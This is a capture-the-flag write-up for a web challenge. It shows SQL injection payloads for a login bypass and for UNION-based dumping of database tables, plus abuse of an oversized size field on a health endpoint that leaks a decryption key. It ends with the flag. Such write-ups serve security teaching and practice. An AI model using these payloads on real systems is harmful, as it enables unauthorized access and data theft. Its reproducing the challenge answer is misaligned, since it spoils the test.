# Heart Part 7

## Description

what happens on earth stays on earth

## Solution Walkthrough

Go to `/login` and use the username `admin` and password `' OR 1=1;--` to log into the admin panel. After clicking "Get Encrypted Flag," you will receive:

```json
{
    "algorithm": "AES-256-CBC",
    "ciphertext": "baCIJCXuBcIOJ23q0FS8GDaSN5/71aIqY156ju5Z6oc=",
    "iv": "fcSvIZ1LMw72z34mvr0O5A==",
    "sealed_by": "MAadCipher v1.0",
    "status": "ok"
}
```

Afterward, I discovered that `/search` is also vulnerable to SQL Injection. By using `' AND 1=0 UNION ALL SELECT 1,sql FROM sqlite_master WHERE type='table'-- -` to view all tables, three tables can be seen:

```sql
CREATE TABLE scrolls ( id INTEGER PRIMARY KEY, title TEXT, content_encrypted TEXT, iv TEXT )
CREATE TABLE users ( id INTEGER PRIMARY KEY, username TEXT, password TEXT, role TEXT )
CREATE TABLE techniques ( id INTEGER PRIMARY KEY, name TEXT, description TEXT )
```

Using `' AND 1=0 UNION ALL SELECT iv,content_encrypted FROM scrolls-- -`, I found an entry with the title "The Ancient Knowledge," which has a `content_encrypted` value of `czQy8WKOjYFxuXb/ZUeuYLythH7Z4eJGSQJa0LStjmA=` and an `iv` of `8rB0/KgrNwf0nMgj5EV4tg==`.

After analyzing this back and forth without much progress, I noticed that sending a POST request to `/health` carries the payload `{"data":"PING","size":4}`. After changing the `size` to `4096`, additional data was revealed:

```text
UElORwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEtFTkRSSUNLX01BU1RFUl9LRVk9nhuKX47UTkcRwPR2jBP1oza8Sm3u6jB3IKh7n8pE8C0AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=
```

The latter part contains `KENDRICK_MASTER_KEY=`. Converting this key into hex yields: `9e1b8a5f8ed44e4711c0f4768c13f5a336bc4a6deeea307720a87b9fca44f02d`.

Once you have this, you can obtain the flag.

## Flag

```text
dalctf{p1mp_p1mp_h00r4y}
```
